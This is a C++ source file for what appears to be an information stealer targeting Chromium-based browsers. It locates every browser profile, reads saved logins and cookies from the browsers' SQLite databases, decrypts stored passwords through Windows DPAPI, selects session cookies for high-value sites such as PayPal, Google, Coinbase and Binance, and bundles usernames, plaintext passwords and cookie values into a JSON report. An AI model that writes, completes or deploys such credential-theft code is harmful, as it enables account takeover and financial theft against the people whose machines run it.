#include "chromium_base.h"
#include "sqlite_minimal.h"
#include "../utils.h"
#include <shlobj.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <sstream>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

extern void LogInfo(const char* message);
extern void LogError(const char* message);

// Helper function to convert bytes to string
static std::string BytesToString(const std::vector<uint8_t>& bytes) {
    return std::string(bytes.begin(), bytes.end());
}

ChromiumBase::ChromiumBase(const std::string& browser_name, const std::wstring& browser_path)
    : browser_name_(browser_name), browser_path_(browser_path) {
}

bool ChromiumBase::FindProfiles() {
    profiles_.clear();
    
    auto search_paths = GetProfileSearchPaths();
    
    for (const auto& base_path : search_paths) {
        if (!Utils::DirectoryExists(base_path)) {
            continue;
        }
        
        // Add default profile
        std::wstring default_profile = base_path + L"\\Default";
        if (Utils::DirectoryExists(default_profile)) {
            profiles_.emplace_back(L"Default", default_profile);
        }
        
        // Look for additional profiles (Profile 1, Profile 2, etc.)
        for (int i = 1; i <= 10; i++) {
            std::wstring profile_name = L"Profile " + std::to_wstring(i);
            std::wstring profile_path = base_path + L"\\" + profile_name;
            
            if (Utils::DirectoryExists(profile_path)) {
                profiles_.emplace_back(profile_name, profile_path);
            }
        }
    }
    
    LogInfo((browser_name_ + " found " + std::to_string(profiles_.size()) + " profiles").c_str());
    return !profiles_.empty();
}

std::vector<ChromiumBase::ChromiumPassword> ChromiumBase::ExtractPasswords() {
    std::vector<ChromiumPassword> all_passwords;
    
    for (const auto& profile : profiles_) {
        auto profile_passwords = ExtractPasswordsFromProfile(profile);
        all_passwords.insert(all_passwords.end(), profile_passwords.begin(), profile_passwords.end());
    }
    
    return all_passwords;
}

std::vector<ChromiumBase::ChromiumCookie> ChromiumBase::ExtractCookies() {
    std::vector<ChromiumCookie> all_cookies;
    
    for (const auto& profile : profiles_) {
        auto profile_cookies = ExtractCookiesFromProfile(profile);
        all_cookies.insert(all_cookies.end(), profile_cookies.begin(), profile_cookies.end());
    }
    
    return all_cookies;
}

std::vector<ChromiumBase::ChromiumPassword> ChromiumBase::ExtractPasswordsFromProfile(const ChromiumProfile& profile) {
    std::vector<ChromiumPassword> passwords;
    
    auto db_names = GetDatabaseNames();
    std::wstring login_db_path = profile.path + L"\\" + Utils::StringToWString(db_names.first);
    
    if (!Utils::FileExists(login_db_path)) {
        return passwords;
    }
    
    try {
        MinimalSQLiteReader reader;
        if (!reader.LoadDatabase(login_db_path)) {
            LogError(("Failed to load " + browser_name_ + " login database").c_str());
            return passwords;
        }
        
        uint32_t rootPage = 0;
        if (!reader.FindTableRootPage("logins", rootPage)) {
            LogError(("Failed to find logins table in " + browser_name_ + " database").c_str());
            return passwords;
        }
        
        auto rows = reader.ExtractTable(rootPage);
        
        for (const auto& row : rows) {
            if (row.size() >= 7) {
                std::string url = BytesToString(row[0]);      // origin_url
                std::string username = BytesToString(row[3]); // username_value
                std::vector<uint8_t> encrypted_pass = row[5]; // password_value
                
                if (!encrypted_pass.empty()) {
                    std::string decrypted_password = DecryptPassword(encrypted_pass);
                    if (!decrypted_password.empty() && !url.empty()) {
                        passwords.emplace_back(url, username, decrypted_password);
                    }
                }
            }
        }
    } catch (...) {
        LogError(("Failed to extract passwords from " + browser_name_ + " profile").c_str());
    }
    
    return passwords;
}

std::vector<ChromiumBase::ChromiumCookie> ChromiumBase::ExtractCookiesFromProfile(const ChromiumProfile& profile) {
    std::vector<ChromiumCookie> cookies;
    
    auto db_names = GetDatabaseNames();
    std::wstring cookies_db_path = profile.path + L"\\" + Utils::StringToWString(db_names.second);
    
    if (!Utils::FileExists(cookies_db_path)) {
        return cookies;
    }
    
    try {
        MinimalSQLiteReader reader;
        if (!reader.LoadDatabase(cookies_db_path)) {
            LogError(("Failed to load " + browser_name_ + " cookies database").c_str());
            return cookies;
        }
        
        uint32_t rootPage = 0;
        if (!reader.FindTableRootPage("cookies", rootPage)) {
            LogError(("Failed to find cookies table in " + browser_name_ + " database").c_str());
            return cookies;
        }
        
        auto rows = reader.ExtractTable(rootPage);
        
        // Important hosts for cookies
        std::vector<std::string> importantHosts = {
            "facebook.com", "google.com", "amazon.com", "paypal.com",
            "github.com", "twitter.com", "instagram.com", "linkedin.com",
            "binance.com", "coinbase.com", "kraken.com"
        };
        
        for (const auto& row : rows) {
            if (row.size() >= 14) {
                std::string host = BytesToString(row[1]);  // host_key
                
                // Check if it's an important host
                bool isImportant = false;
                for (const auto& important : importantHosts) {
                    if (host.find(important) != std::string::npos) {
                        isImportant = true;
                        break;
                    }
                }
                
                if (isImportant) {
                    std::string name = BytesToString(row[2]);   // name
                    std::string value = BytesToString(row[3]);  // value
                    
                    if (!host.empty() && !name.empty() && !value.empty()) {
                        cookies.emplace_back(host, name, value);
                    }
                }
            }
        }
    } catch (...) {
        LogError(("Failed to extract cookies from " + browser_name_ + " profile").c_str());
    }
    
    return cookies;
}

std::string ChromiumBase::DecryptPassword(const std::vector<uint8_t>& encrypted_password) {
    if (encrypted_password.empty()) {
        LogError("DecryptPassword: Empty password data");
        return "";
    }
    
    // Validate minimum size
    if (encrypted_password.size() < 1) {
        LogError("DecryptPassword: Password data too small");
        return "";
    }
    
    try {
        // Check for DPAPI encryption (older Chrome versions)
        if (encrypted_password.size() > 0 && encrypted_password[0] != 'v') {
            DATA_BLOB input;
            DATA_BLOB output;
            
            input.pbData = const_cast<BYTE*>(encrypted_password.data());
            input.cbData = static_cast<DWORD>(encrypted_password.size());
            
            // Additional validation for DPAPI blob size
            if (input.cbData > 10000) { // Sanity check: 10KB max
                LogError("DecryptPassword: DPAPI blob too large");
                return "";
            }
            
            BOOL result = CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output);
            if (result) {
                if (output.pbData == NULL || output.cbData == 0) {
                    LogError("DecryptPassword: DPAPI returned null data");
                    return "";
                }
                
                // Validate output size
                if (output.cbData > 1000) { // Sanity check: 1KB max for password
                    LogError("DecryptPassword: Decrypted password too large");
                    LocalFree(output.pbData);
                    return "";
                }
                
                std::string result_str(reinterpret_cast<char*>(output.pbData), output.cbData);
                LocalFree(output.pbData);
                return result_str;
            } else {
                DWORD error = GetLastError();
                LogError(("DecryptPassword: DPAPI failed with error " + std::to_string(error)).c_str());
                return "";
            }
        }
        
        // Handle newer AES encryption (v10, v11 prefixes)
        if (encrypted_password.size() > 3 && 
            encrypted_password[0] == 'v' && 
            encrypted_password[1] == '1') {
            
            // Validate AES encrypted data format
            if (encrypted_password.size() < 20) { // Minimum: v10 + 16 bytes
                LogError("DecryptPassword: AES encrypted data too small");
                return "";
            }
            
            // This would require extracting the AES key from Local State
            // For now, return placeholder with validation
            LogInfo("DecryptPassword: Found AES encrypted password (modern Chrome)");
            return "[AES_ENCRYPTED]";
        }
        
        LogError("DecryptPassword: Unknown encryption format");
        return "";
        
    } catch (const std::exception& e) {
        LogError(("DecryptPassword exception: " + std::string(e.what())).c_str());
        return "";
    } catch (...) {
        LogError("DecryptPassword: Unknown exception occurred");
        return "";
    }
}

std::string ChromiumBase::GenerateReport() {
    std::ostringstream json;
    
    json << "{";
    json << "\"browser\":\"" << EscapeJson(browser_name_) << "\",";
    json << "\"profiles\":[";
    
    auto passwords = ExtractPasswords();
    auto cookies = ExtractCookies();
    
    bool first_profile = true;
    for (const auto& profile : profiles_) {
        if (!first_profile) json << ",";
        first_profile = false;
        
        json << "{";
        json << "\"name\":\"" << EscapeJson(Utils::WStringToString(profile.name)) << "\",";
        json << "\"path\":\"" << EscapeJson(Utils::WStringToString(profile.path)) << "\",";
        
        // Add passwords for this profile
        json << "\"passwords\":[";
        bool first_pass = true;
        for (const auto& pass : passwords) {
            if (!first_pass) json << ",";
            first_pass = false;
            
            json << "{";
            json << "\"url\":\"" << EscapeJson(pass.url) << "\",";
            json << "\"username\":\"" << EscapeJson(pass.username) << "\",";
            json << "\"password\":\"" << EscapeJson(pass.password) << "\"";
            json << "}";
        }
        json << "],";
        
        // Add cookies for this profile  
        json << "\"cookies\":[";
        bool first_cookie = true;
        for (const auto& cookie : cookies) {
            if (!first_cookie) json << ",";
            first_cookie = false;
            
            json << "{";
            json << "\"host\":\"" << EscapeJson(cookie.host) << "\",";
            json << "\"name\":\"" << EscapeJson(cookie.name) << "\",";
            json << "\"value\":\"" << EscapeJson(cookie.value) << "\"";
            json << "}";
        }
        json << "]";
        json << "}";
    }
    
    json << "]}";
    return json.str();
}

std::string ChromiumBase::EscapeJson(const std::string& str) {
    std::string escaped;
    escaped.reserve(str.length());
    
    for (char c : str) {
        switch (c) {
            case '"': escaped += "\\\""; break;
            case '\\': escaped += "\\\\"; break;
            case '\b': escaped += "\\b"; break;
            case '\f': escaped += "\\f"; break;
            case '\n': escaped += "\\n"; break;
            case '\r': escaped += "\\r"; break;
            case '\t': escaped += "\\t"; break;
            default:
                if (c >= 0x20) {
                    escaped += c;
                } else {
                    escaped += "\\u";
                    escaped += "0000";
                    // Simple placeholder for control characters
                }
                break;
        }
    }
    
    return escaped;
}